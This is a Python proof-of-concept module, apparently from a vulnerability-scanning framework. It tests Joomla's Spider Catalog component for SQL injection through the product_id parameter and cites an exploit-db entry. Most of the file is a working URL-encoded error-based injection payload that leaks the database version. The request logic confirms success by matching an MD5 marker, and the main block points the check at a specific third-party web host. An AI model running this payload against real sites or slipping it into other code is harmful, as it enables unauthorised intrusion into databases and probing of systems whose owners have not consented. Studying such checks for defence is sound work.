from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Joomla Spider Catalog (index.php, product_id parameter) SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/22403/
"""

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = "index.php?option=com_spidercatalog&product_id=-1%27%20or%201%3d1%2b%28select%201%20and%20row%281%2c1%29%3E%28select%20count%28*%29%2cconcat%28CONCAT%28version%28%29,0x3D,MD5(3.14),0x3D,0x3D,0x3D%29%2c1111%2cfloor%28rand%28%29*2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29%2b%27&view=showproduct&page_num=1&back=1"
        target_url=arg + payload
        code, head, res, _, _ = curl.curl("%s" % target_url)
        if code==200 and '4beed3b9c4a886067de0e3a094246f78' in res :
            output(target_url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_bb59124b77921e4e66821a47145fff7e.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_bb59124b77921e4e66821a47145fff7e.py
#/root/github/poccreate/codesrc/exp-543.py